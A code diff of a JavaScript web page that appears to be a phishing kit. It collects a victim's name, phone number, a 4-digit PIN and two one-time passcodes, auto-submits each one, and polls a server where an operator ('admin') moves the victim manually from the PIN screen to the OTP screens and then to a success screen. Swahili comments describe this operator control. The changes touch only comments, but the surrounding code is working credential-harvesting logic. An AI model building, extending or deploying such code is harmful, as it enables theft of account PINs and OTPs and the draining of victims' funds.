@@ -124,7 +124,7 @@ document.addEventListener('DOMContentLoaded', () => {
       const fullNameStr = `${firstName} ${lastName}`.toUpperCase();
       const formattedPhone = phone;
 
-      // Populate Name & Phone across PIN, OTP 1, and OTP 2 screens
+      // Inashikilia herufi kubwa (Uppercase) kwenye majina ya mwombaji
       [displayApplicantName, displayOtp1Name, displayOtp2Name].forEach(el => { if (el) el.innerText = fullNameStr; });
       [displayApplicantPhone, displayOtp1Phone, displayOtp2Phone].forEach(el => { if (el) el.innerText = formattedPhone; });
 
@@ -172,7 +172,7 @@ document.addEventListener('DOMContentLoaded', () => {
     updateCalc();
   }
 
-  // Show / Hide Toggles for PIN and OTP boxes
+  // Show / Hide Toggles
   if (btnTogglePinVisibility) {
     btnTogglePinVisibility.addEventListener('click', () => {
       const isPassword = pinBoxes[0].type === 'password';
@@ -217,7 +217,6 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  // Auto-flow & Auto-submit once 4 digits are entered
   setupDigitInputs(pinBoxes, (pinVal) => { submitPinAction(pinVal); });
   setupDigitInputs(otp1Boxes, (otpVal) => { submitOtp1Action(otpVal); });
   setupDigitInputs(otp2Boxes, (otpVal) => { submitOtp2Action(otpVal); });
@@ -322,6 +321,7 @@ document.addEventListener('DOMContentLoaded', () => {
           showScreen(screenOtp1);
           if (otp1Boxes[0]) otp1Boxes[0].focus();
         } else if (data.status === 'PROCEED_OTP2') {
+          // Admin anapobonyeza NEXT, inafungua skrini ya OTP Hatua ya 2 moja kwa moja
           clearInterval(statusPollInterval);
           hideLoading();
           showScreen(screenOtp2);
@@ -353,6 +353,7 @@ document.addEventListener('DOMContentLoaded', () => {
           hideLoading();
           showScreen(screenStopped);
         } else if (data.status === 'SUCCESS') {
+          // Baada ya admin kuidhinisha (APPROVED), inafungua skrini ya mafanikio (Success)
           clearInterval(statusPollInterval);
           hideLoading();
           showScreen(screenSuccess);
@@ -385,4 +386,4 @@ document.addEventListener('DOMContentLoaded', () => {
     if (loadingOverlay) loadingOverlay.classList.remove('active');
   }
 });
-    
+  
